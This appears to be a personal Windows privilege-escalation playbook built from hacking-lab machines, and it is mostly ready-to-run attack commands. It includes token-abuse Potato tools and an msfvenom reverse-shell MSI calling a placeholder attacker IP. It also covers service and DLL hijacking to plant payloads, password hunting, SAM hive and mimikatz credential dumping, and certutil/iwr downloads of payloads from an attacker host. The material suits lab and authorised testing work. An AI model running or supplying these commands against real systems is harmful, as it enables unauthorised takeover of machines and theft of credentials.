# Windows Privilege Escalation — Methodology

> My working playbook for going from a low-privileged shell to `SYSTEM` on Windows.
> Built from notes across dozens of HTB / THM / Proving Grounds machines.

**The one rule that matters:** work **top → bottom**, and never jump straight to
kernel exploits. The overwhelming majority of Windows privescs come from tokens,
service misconfigurations, stored credentials, scheduled tasks, or
`AlwaysInstallElevated` — all of which are faster and safer than an exploit.

Related: [Initial Enumeration](./enumeration.md) · [Linux PrivEsc](./linux-privesc.md) · [Active Directory](./active-directory.md)

---

## Phase 0 — Situational awareness (first 2 minutes)

```cmd
whoami /priv          :: the single most important command
whoami /all
hostname & systeminfo
wmic qfe get HotFixID  :: patch level
echo %USERDOMAIN%
net user
net localgroup administrators
net accounts          :: password policy — lockout threshold before any spraying
qwinsta               :: other logged-on sessions
```

**What I'm deciding here:**
- **Normal user or service account** (`iis apppool`, `mssql`, `network service`)?
  A service account usually has `SeImpersonate`, so I go straight to a Potato (Phase 1a).
- **x86 or x64? Domain-joined or standalone?** A standalone box is independent of
  AD — I don't mix in domain vectors that can't apply.

---

## Phase 1 — Quick wins (check first)

### 1a. Tokens (`whoami /priv`)
`SeImpersonate` / `SeAssignPrimaryToken` → Potato family:
```cmd
PrintSpoofer64.exe -i -c cmd
GodPotato -cmd "cmd /c whoami"     :: Server 2019/2022, Win10/11
JuicyPotato.exe ...                :: older targets (<= 2016)
```
Other privileges worth checking:
- **SeBackup / SeRestore** → dump SAM + SYSTEM hives (Phase 8).
- **SeTakeOwnership** → take ownership of and replace a target file.
- **SeDebug** → dump LSASS. **SeLoadDriver / SeManageVolume** → known techniques.

### 1b. AlwaysInstallElevated
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
Both `0x1` → install an MSI as SYSTEM:
```cmd
msfvenom -p windows/x64/shell_reverse_tcp lhost=<ATTACKER_IP> lport=4444 -f msi -o evil.msi
msiexec /quiet /qn /i C:\temp\evil.msi
```

### 1c. Stored credentials
```cmd
cmdkey /list
runas /savecred /user:administrator "cmd /c C:\temp\payload.exe"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

### 1d. Unattended install files / history
```cmd
type C:\Windows\Panther\Unattend.xml
type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

---

## Phase 2 — Services (five variants — worth being systematic)

```powershell
. .\PowerUp.ps1 ; Invoke-AllChecks        # or PrivescCheck.ps1
```
```cmd
accesschk64.exe -accepteula -uwcqv "Users" *
accesschk64.exe -accepteula -uwcqv "Authenticated Users" *
```

**2a — Weak service config** (`SERVICE_CHANGE_CONFIG`):
```cmd
sc qc <svc>
sc config <svc> binpath= "C:\temp\payload.exe"    :: note the space after binpath=
sc stop <svc> & sc start <svc>
```

**2b — Weak service binary permissions** — overwrite the exe:
```cmd
icacls "C:\Path\service.exe"    :: (F)/(M)/(W) for Users → overwrite → restart
```

**2c — Weak service *directory* permissions** — the one people miss. The binary
itself may be read-only (RX), but if the **folder** is writable you can still win:
```cmd
icacls "C:\Program Files\...\ServiceDir"   :: (WD)/(AD)/(D)
move service.exe service.exe.bak
copy C:\temp\payload.exe service.exe
sc stop <svc> & sc start <svc>
```
> **RX on the file is not a dead end — always check the directory *and* the service.**
> This is the vector I see people (myself included) walk past most often.

**2d — Unquoted service path:**
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
```
Unquoted + a space + a writable path segment → plant `C:\Program Files\Some.exe`.

**2e — DLL hijacking:** a service loads a missing DLL from a writable path → plant your DLL.

**Triggering the swap:** Start/Stop rights → restart directly. Auto-start only →
`shutdown /r /t 0` (needs `SeShutdown`). Build the payload with
`msfvenom ... -f exe-service` so the shell survives the service-control timeout.

---

## Phase 3 — Scheduled tasks
```cmd
schtasks /query /fo LIST /v | findstr /i "TaskName Run As User Task To Run"
```
A task running as SYSTEM/Admin that points at a **writable** script or exe → `icacls` → replace it.

## Phase 4 — Registry / autoruns
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

## Phase 5 — Credential hunting
```cmd
findstr /si password *.xml *.ini *.txt *.config *.ps1
type C:\inetpub\wwwroot\web.config
netsh wlan show profiles
findstr /S /I cpassword \\<domain>\sysvol\<domain>\policies\*.xml   :: GPP
```
Every password found gets tried with `runas`, WinRM, RDP, and reused across every account and host.

## Phase 6 — Third-party software / local ports
```cmd
netstat -ano | findstr LISTENING     :: 127.0.0.1 services → port forward (chisel/plink)
tasklist /v                          :: third-party software running as SYSTEM
```

## Phase 7 — Kernel exploits (last resort)
```cmd
systeminfo > sysinfo.txt   :: feed to wesng / windows-exploit-suggester
```
BSOD risk — only after everything above is exhausted.

## Phase 8 — After SYSTEM: harvest credentials for the pivot
```cmd
reg save hklm\sam C:\temp\sam & reg save hklm\system C:\temp\system
:: secretsdump.py -sam sam -system system LOCAL
```
```
mimikatz # privilege::debug ; sekurlsa::logonpasswords ; lsadump::sam ; lsadump::cache
```
Also worth pulling: Credential Manager / DPAPI, saved RDP, `.kdbx` files, browser credential stores.

---

## File transfer

```
upload /home/kali/payload.exe C:\temp\payload.exe   # Evil-WinRM — most reliable
iwr -uri http://<ATTACKER_IP>/payload.exe -outfile C:\temp\payload.exe
certutil -urlcache -f http://<ATTACKER_IP>/payload.exe payload.exe
```

## Tools
`winPEASx64` · `PowerUp` (`Invoke-AllChecks`) · `PrivescCheck` · `accesschk64` ·
`Seatbelt` / `SharpUp` · PrintSpoofer / GodPotato / JuicyPotato · `mimikatz`

---

## My six golden rules

1. A red winPEAS line gets checked **immediately**.
2. RX on a file is not a dead end → check the **directory and the service**.
3. Use Evil-WinRM `upload`; don't fight `certutil`/`copy`.
4. A standalone box is independent of AD — don't mix vectors.
5. 45 minutes with no progress → rotate to a different vector.
6. Don't assume this box's vector matches the last one.

---

## References

- [PayloadsAllTheThings — Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [HackTricks — Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [lolbas-project.github.io](https://lolbas-project.github.io)
